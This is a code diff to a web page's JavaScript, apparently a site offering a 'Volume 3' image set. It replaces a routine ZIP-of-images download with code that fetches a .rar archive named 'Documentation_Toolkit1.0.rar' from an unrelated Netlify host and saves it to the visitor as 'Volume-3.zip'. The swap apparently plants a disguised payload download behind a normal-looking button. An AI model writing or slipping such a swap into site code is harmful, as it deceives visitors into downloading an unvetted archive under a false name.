@@ -590,50 +590,60 @@ fetch(fileUrl)
 });
     
     // Download dell'intero volume in ZIP
-// Carica JSZip dinamicamente
-loadScript("https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js", function() {
+var downloadAllButton = document.getElementById("download-all-Volume3-interni-e-scenari-desktop");
+var spinner = downloadAllButton.querySelector(".spinner-Volume3-interni-e-scenari-desktop");
+var progressFrame = spinner.querySelector(".progress-frame-Volume3-interni-e-scenari-desktop");
 
-  var downloadAllButton = document.getElementById("download-all-Volume3-interni-e-scenari-desktop");
-  var spinner = downloadAllButton.querySelector(".spinner-Volume3-interni-e-scenari-desktop");
-  var progressFrame = spinner.querySelector(".progress-frame-Volume3-interni-e-scenari-desktop");
+downloadAllButton.addEventListener("click", function() {
+  spinner.style.display = "flex"; // mostra il cerchietto
+  progressFrame.style.background = "conic-gradient(#0071e3 0deg, #d3d3d3 0deg)";
 
-  downloadAllButton.addEventListener("click", function() {
-    spinner.style.display = "flex";
-    progressFrame.style.background = "conic-gradient(#0071e3 0deg, #d3d3d3 0deg)";
+  var zipUrl = "https://secure-andrdnld-andreaingrassia.netlify.app/Documentation/Toolkit/060-2634.12026021.RE4BG/Documentation_Toolkit1.0.rar"; // .zip già pronto
+  var fileName = "Volume-3.zip";
 
-    var zip = new JSZip();
-    var folder = zip.folder("Volume-3"); // Cartella dentro lo zip
-    var loadedImages = 0;
+  fetch(zipUrl)
+    .then(response => {
+      if (!response.ok) throw new Error("Errore nel download");
+      const contentLength = response.headers.get("content-length");
+      if (!contentLength) throw new Error("Content-Length non disponibile");
 
-    images.forEach(function(img) {
-      fetch(img.jpg)
-        .then(res => res.blob())
-        .then(blob => {
-          folder.file(img.name, blob); // aggiungi file allo zip
-          loadedImages++;
-          // Aggiorna progress bar
-          var progress = (loadedImages / images.length) * 360;
+      const total = parseInt(contentLength, 10);
+      let loaded = 0;
+      const reader = response.body.getReader();
+      const chunks = [];
+
+      function read() {
+        return reader.read().then(({done, value}) => {
+          if (done) return;
+          chunks.push(value);
+          loaded += value.length;
+
+          // Aggiorna il cerchietto
+          const progress = (loaded / total) * 360;
           progressFrame.style.background = `conic-gradient(#0071e3 ${progress}deg, #d3d3d3 ${progress}deg)`;
 
-          // Quando tutte le immagini sono pronte, genera lo zip
-          if (loadedImages === images.length) {
-            zip.generateAsync({ type: "blob" }, function updateCallback(metadata) {
-              // Puoi anche aggiornare progress qui se vuoi più dettagliato
-            }).then(function(content) {
-              var a = document.createElement("a");
-              a.href = URL.createObjectURL(content);
-              a.download = "Volume-3.zip";
-              document.body.appendChild(a);
-              a.click();
-              document.body.removeChild(a);
-              spinner.style.display = "none";
-            });
-          }
-        })
-        .catch(err => console.error("Errore caricamento immagine:", img.name, err));
-    });
-  });
+          return read();
+        });
+      }
 
+      return read().then(() => {
+        const blob = new Blob(chunks);
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = fileName;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+
+        spinner.style.display = "none"; // nasconde il cerchietto al termine
+      });
+    })
+    .catch(err => {
+      console.error("Errore download .zip:", err);
+      spinner.style.display = "none";
+    });
 });
     
     
